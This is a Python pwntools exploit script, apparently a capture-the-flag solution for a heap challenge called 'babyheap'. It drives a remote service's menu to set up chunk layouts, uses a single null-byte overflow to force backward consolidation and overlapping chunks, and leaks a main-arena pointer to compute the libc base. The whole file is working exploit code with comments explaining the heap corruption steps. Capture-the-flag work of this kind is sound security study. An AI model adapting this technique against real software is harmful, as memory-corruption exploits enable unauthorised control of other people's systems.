#!/usr/bin/env python

from pwn import *

def alloc(size, content):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil('please input chunk size: ')
    p.sendline(str(size))
    p.recvuntil('input chunk content: ')
    p.send(content)
    
    if len(content) < size:
        p.sendline()

def show(index):
    p.recvuntil('choice: ')
    p.sendline('2')
    p.recvuntil('please input chunk index: ')
    p.sendline(str(index))

def delete(index):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil('please input chunk index: ')
    p.sendline(str(index))

p = remote('babyheap.2018.teamrois.cn', 3154)
#p = process('./babyheap')

alloc(16, 'a' * 16)   # 0 fast bin (in order to prevent consolidation with first chunk)
alloc(240, 'b' * 240) # 1 small bin
alloc(112, 'c' * 112) # 2 fast bin
alloc(240, 'd' * 240) # 3 small bin
alloc(16, 'e' * 16)   # 4 fast bin (in order to prevent consolidation with top chunk)

delete(1)
delete(2)

# write one null byte to convert chunk #3's size from 0x101 to 0x100
# make the chunk #3's previous chunk NOT in use
# make chunk #3's prev_size == 384
alloc(120, 'f' * 112 + p64(384)) # 1 fast bin

# chunk #3 consolidates with chunk #1 because its prev_size == 384
# basically, chunk #2 is forgotten
delete(3)

# chunk #1 overlaps with a free chunk
# free chunk's fd and bk point to main arena
alloc(240, 'g' * 240) # 2 small bin

# leak the main arena address, which leads to libc base address
show(1)

p.recvuntil('content: ')
libc_base = u64(p.recv(6) + '\x00\x00') - 0x3c4b78

print 'libc base: {}'.format(hex(libc_base))

p.interactive()

